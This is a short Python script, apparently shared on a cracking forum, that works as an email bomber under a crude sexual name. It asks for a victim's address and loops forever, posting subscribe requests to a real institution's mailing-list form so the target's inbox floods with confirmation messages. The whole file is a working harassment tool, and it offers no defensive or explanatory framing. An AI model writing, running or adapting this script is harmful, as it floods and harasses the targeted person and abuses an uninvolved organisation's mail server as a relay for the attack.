from colorama import Fore
import subprocess
import requests
import os, sys, time

os.system('cls')

print(Fore.RED + """


███████╗██████╗ ███████╗██████╗ ███╗   ███╗██╗███████╗██╗   ██╗
██╔════╝██╔══██╗██╔════╝██╔══██╗████╗ ████║██║██╔════╝╚██╗ ██╔╝
███████╗██████╔╝█████╗  ██████╔╝██╔████╔██║██║█████╗   ╚████╔╝ 
╚════██║██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██╔══╝    ╚██╔╝  
███████║██║     ███████╗██║  ██║██║ ╚═╝ ██║██║██║        ██║   
╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝        ╚═╝  
                                                               `made by https://cracked.to/ANG
Spermify ready to sperm a inbox!

""")


email = input(Fore.LIGHTCYAN_EX + 'email you want to bomb: ')

def man():
    r = requests.session()

    param = {
        'email': email,
        'pw': 'a',
        'pw-conf': 'a',
        'email-button': 'Subscribe',
    }

    dat = r.post('http://snake.salk.edu/mailman/subscribe/salk-bulletin', data=param).text
    if 'received' in dat:
        print(Fore.LIGHTMAGENTA_EX + '[Spermify] email send')
    else:
        print('[Spermify] error')


while(True):
    man()